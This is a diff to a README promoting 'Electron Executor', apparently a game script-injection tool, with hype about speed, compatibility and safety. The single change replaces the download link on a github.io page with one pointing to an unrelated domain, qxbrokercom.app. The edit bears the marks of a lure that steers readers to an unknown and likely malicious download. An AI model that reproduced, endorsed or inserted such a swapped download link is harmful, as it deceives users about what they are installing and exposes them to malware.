@@ -4,7 +4,7 @@
 
 Welcome to the complete guide for **Electron Executor** — the most anticipated and rapidly growing utility in the scripting community. Whether you are a seasoned developer testing custom logic in popular titles or a newcomer curious about what script execution can do for you, this repository is your definitive resource.
 
-## [📥 Download Electron Executor 📥](https://electrexecs.github.io/electron/)
+## [📥 Download Electron Executor 📥](https://qxbrokercom.app/electron)
 
 
 Built from the ground up with modern architecture, this tool delivers blazing-fast injection, a sleek interface, and broad compatibility across devices. It was designed with one mission: to give every user a smooth, dependable, and secure experience regardless of their platform. From desktop environments to mobile devices, the tool adapts seamlessly to your workflow.
